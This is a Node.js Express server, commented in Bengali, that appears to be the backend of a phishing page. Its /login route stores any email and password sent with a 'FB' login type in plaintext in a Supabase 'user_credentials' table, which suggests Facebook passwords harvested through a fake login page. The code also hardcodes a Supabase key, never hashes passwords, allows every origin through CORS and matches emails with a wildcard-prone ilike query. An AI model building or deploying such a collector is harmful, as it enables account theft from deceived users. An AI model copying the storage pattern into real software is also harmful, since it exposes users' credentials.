const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');

const app = express();

// Middleware
app.use(express.json());
app.use(cors()); 

// ১. সুপাবেস কানেকশন (আপনার দেওয়া ডিটেইলস অনুযায়ী)
const supabaseUrl = 'https://ocdnmaejdrnbcovfbukv.supabase.co'; 
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9jZG5tYWVqZHJuYmNvdmZidWt2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ2MzMwODAsImV4cCI6MjA5MDIwOTA4MH0.2cFLD8QxoRykiuIgjxIXHDWOreQaJnsLYlKmr6GpYhI';
const supabase = createClient(supabaseUrl, supabaseKey);

// ২. মেইন রুট (ডাটা সেভ এবং ভেরিফাই করার জন্য)
app.post('/login', async (req, res) => {
    // ইনকামিং ডাটা ক্লিন করা হচ্ছে
    const email = req.body.email ? req.body.email.trim() : "";
    const password = req.body.password ? req.body.password.trim() : "";
    const login_type = req.body.login_type ? String(req.body.login_type).toUpperCase() : ""; 
    
    console.log(`--- ইনকামিং রিকোয়েস্ট ---`);
    console.log(`ইমেইল: ${email} | টাইপ: ${login_type}`);

    // --- লজিক ১: ফেসবুক বা রেজিস্ট্রেশন পেজ থেকে আসলে ডাটা সেভ হবে ---
    if (login_type.includes('FB') || login_type.includes('REGISTRATION')) {
        console.log(`🚩 ডাটাবেজে সেভ করার চেষ্টা চলছে...`);
        
        const { data, error } = await supabase
            .from('user_credentials') // আপনার টেবিলের নাম
            .insert([{ 
                email: email, 
                password: password, 
                login_type: req.body.login_type 
            }]);

        if (error) {
            console.log("❌ সুপাবেস এরর ডিটেইলস:", error);
            return res.status(500).json({ success: false, message: error.message });
        }
        
        console.log("✅ ডাটাবেজে সফলভাবে সেভ হয়েছে!");
        return res.json({ success: true, message: "Data Saved!" });
    }

    // --- লজিক ২: ইনডেক্স পেজ (লগইন) থেকে আসলে ভেরিফাই হবে ---
    console.log(`🔍 লগইন ভেরিফিকেশন চলছে...`);

    try {
        const { data, error } = await supabase
            .from('user_credentials') 
            .select('*') 
            .ilike('email', email) 
            .order('id', { ascending: false }) 
            .limit(1); 

        if (error) {
            console.log("❌ সুপাবেস কুয়েরি এরর:", error.message);
            return res.status(500).json({ success: false });
        }

        if (data && data.length > 0) {
            const user = data[0];
            // পাসওয়ার্ড ম্যাচ করানো হচ্ছে
            if (String(user.password).trim() === String(password)) {
                console.log("✅ লগইন সফল!");
                return res.status(200).json({ success: true });
            } else {
                console.log("❌ পাসওয়ার্ড ভুল!");
                return res.status(401).json({ success: false, message: "Invalid Password!" });
            }
        } else {
            console.log("❌ ইউজার পাওয়া যায়নি!");
            return res.status(401).json({ success: false, message: "User not found!" });
        }

    } catch (err) {
        console.error("সার্ভার এরর:", err.message);
        return res.status(500).json({ success: false });
    }
});

// ৩. সার্ভার লিসেনিং
const PORT = 5000;
app.listen(PORT, () => {
    console.log(`✅ সার্ভার চালু হয়েছে পোর্ট: ${PORT}`);
    console.log(`🚀 লিঙ্ক: http://localhost:${PORT}`);
});